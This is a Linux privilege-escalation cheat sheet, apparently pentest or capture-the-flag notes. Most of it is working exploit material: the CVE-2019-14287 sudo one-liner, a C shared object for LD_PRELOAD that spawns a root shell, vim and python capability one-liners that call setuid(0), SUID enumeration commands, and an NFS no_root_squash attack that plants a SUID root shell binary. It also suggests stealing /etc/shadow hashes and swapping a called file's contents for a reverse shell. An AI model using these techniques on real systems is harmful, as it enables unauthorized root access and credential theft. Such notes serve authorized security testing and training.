Check SUDO​

  • sudo -l - list

  • sudo -u <user> - run as

  • Check if you can run anything as sudo. If you have write privileges on it, you can injecta /bin/bash to upgrade your shell. If you have write privileges on something that it calls, you can change that files content to a reverse shell.

CVE-2019-14287 (Sudo < 1.8.28)​

sudo -u#-1 /bin/bash

LD_PRELOAD​

  • If you can run something as sudo with env_keep+=LD_PRELOAD you can compile a .so to load before the binary. LD_PRELOAD is a env variable that allows any program to use shared libraries. If the "env_keep" option is enabled, you can generate a shared library that will be loaded and executed before the program is run. LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID.

Here is the .c to exploit the preload:

#include <stdlib.h> 
#include <unistd.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0); 
    system("/bin/bash");
}

Compile: gcc -fPIC -shared -o shell.so shell.c -nostartfiles

Call: sudo LD_PRELOAD=shell.so <binary>

SUID & SGID​

If you can read something as root, try to get the /etc/shadow hashes

  • SUID (4000) -> u+s
  • SGID (2000) -> g+s
  • sticky (1000) -> +t
# SUID
find / -perm -u=s -type f 2>/dev/null

find / -user root -perm -4000 -exec ls -ldb {} \;

# SGID
find / -user root -perm -2000 -exec ls -ldb {} \;

# Both
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null

Binary / Process Capabilities​

  • GTFOBins

cap_setuid+ep capability allows a binary to change its user ID to any user (including root) with the capability immediately active when executed.

# list capabilities
getcap -r / 2>/dev/null

# if vim
./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'

# if python
python3 -c 'import os; os.setuid(0); os.execl("/bin/sh","sh")'

Check for NFS​

Network File Sharing.

# check NFS | 'no_root_squash' option
cat /etc/exports

# enumerate from attacker machine
showmount -e <remote_host>

# mount one 'no_root_squash'
mkdir /tmp/evil
mount -o rw <remote_host>:/<nfs_share> /tmp/evil

cd /tmp/evil

Create a shell.c

#include <unistd.h>
#include <stdlib.h>
int main() {
    setgid(0);
    setuid(0);
    system("/bin/bash");
    return 0;
}
  • Compile: gcc shell.c -o shell -w -static
  • Transfer: cp shell /tmp/evil
  • Change user and group: chown root:root shell
  • Set SUID: chmod 4777 <bin>
